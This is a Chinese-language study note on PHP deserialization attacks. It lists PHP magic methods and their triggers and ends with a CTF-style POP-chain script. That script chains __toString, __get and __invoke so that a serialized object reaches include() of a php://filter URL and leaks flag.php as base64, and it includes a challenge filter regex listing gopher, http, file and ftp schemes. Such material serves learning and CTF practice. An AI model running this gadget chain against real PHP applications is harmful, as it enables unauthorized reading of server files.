相关概念  
序列化可以实现将对象压缩并格式化，方便数据的传输和存储  
序列化（Serialization）：将对象的状态信息转换为可以存储或传输的形式的过程，一般将对象转换为字节流。序列化时，对象的当前状态被写入到临时或持久性存储区（文件、内存、数据库等）。  
反序列化（Deserialization）：从序列化的表示形式中提取数据，即把有序字节流恢复为对象的过程  
反序列化攻击：攻击者控制了序列化后的数据，将有害数据传递到应用程序代码中，发动针对应用程序的攻击。  

这个与代码审计关系很大，不详细展开  
常用的魔术方法
__sleep()	 	//使用serialize（）时触发 
__destruct() 	//对象被销毁时触发，在脚本终止或对象引用计数为0时调用，通常会执行数据清除就或连接断开操作 
__call() 		//在对象上下文中调用不可访问的方法时触发 ，通常用于错误处理，防止脚本因为调用错误而终止执行
__callStatic() 	//在静态上下文中调用不可访问的方法时触发 
__get() 		//用于从不可访问的属性读取数据，通常用于设置和获取对象私有属性
__set() 		//用于将数据写入不可访问的属性，通常用于设置和获取对象私有属性
__isset() 		//在不可访问的属性上调用isset()或empty()触发 
__unset() 		//在不可访问的属性上使用unset()时触发 
__invoke() 		//当脚本尝试将对象调用为函数时触发
__clone()       //当把一个对象赋给另一个对象时自动调用
__wakeup()		//unserialize函数会检查是否存在wakeup方法，如果存在则先调用wakeup方法，做一些必要的初始化连数据库等操作
__construct() 	//PHP5允许在一个类中定义一个方法作为构造函数。具有构造函数的类会在每次创建新对象时先调用此方法
__destruct()	  //PHP5引入析构函数的概念，析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行
__toString()	  //用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误

*_construct 当一个对象创建时被调用，*
*__destruct 当一个对象销毁时被调用，*
*__wakeup() 使用 unserialize 时触发*
*__sleep() 使用 serialize 时触发*
*__call() 在对象上下文中调用不可访问的方法时触发*
*__callStatic() 在静态上下文中调用不可访问的方法时触发*
*__get() 用于从不可访问的属性读取数据*
*__set() 用于将数据写入不可访问的属性*
*__isset() 在不可访问的属性上调用 isset()或 empty()触发*
*__unset() 在不可访问的属性上使用 unset()时触发*
*__toString() 把类当作字符串使用时触发,返回值需要为字符串*
*__invoke() 当脚本尝试将对象作为函数调用时触发*

private 类型会在属性名前面添加额外的空白字符，s:12:%22xuegodfile%22;长度为 12，
xuegodfile 的长度仅为 10，所以需要在 xuegod 左右各添加空白字符。

------
pop链构造  
<?php
class Modifier {
    protected  $var="php://filter/read=convert.base64-encode/resource=flag.php";
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this->append($this->var);
    }
}

class Show
{
    public $source;
    public $str;

    public function __construct($file = "index.php")
    {
        $this->source = $file;
        echo 'Welcome to ' . $this->source . "<br>";
    }

    public function __toString()
    {

        return $this->str->source;
    }

    public function __wakeup()
    {
        if (preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}

class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){
        $function = $this->p;
        return $function();
    }

}
$a = new Modifier();
$b = new Show();
$c = new Test();
$c->p = $a;
$b->source = new Show();
$b->source->str = $c;
echo serialize($b);

